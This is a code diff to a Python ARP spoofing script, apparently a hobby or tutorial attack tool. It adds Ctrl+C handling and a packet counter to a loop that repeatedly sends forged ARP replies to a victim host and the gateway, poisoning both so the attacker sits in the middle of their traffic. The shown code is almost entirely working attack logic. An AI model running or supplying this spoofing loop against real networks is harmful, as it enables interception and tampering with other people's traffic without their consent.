@@ -21,10 +21,20 @@ def spoof(target_ip: str, spoof_ip: str) -> None:
     
 
 sent_packets_count = 0
-while True:
-    # sending arp packets to victim
-    spoof("192.168.12.102", "192.168.12.1")
-    # sending arp packets to gateway
-    spoof("192.168.12.1", "192.168.12.102")
-    print(f"[+] Packets Sent: {sent_packets_count}")
-    time.sleep(2)
+try:
+    while True:
+        # sending arp packets to victim
+        spoof("192.168.12.102", "192.168.12.1")
+        # sending arp packets to gateway
+        spoof("192.168.12.1", "192.168.12.102")
+        sent_packets_count += 2
+    
+        # \r to print in same line by overriding the previous print
+        print(f"\r[+] Packets Sent: {sent_packets_count}", end="")
+        time.sleep(2)
+        
+except KeyboardInterrupt:
+    print("[+] Detected CTRL + C ..... Quitting.")
+    
+finally:
+    print("Exited..")
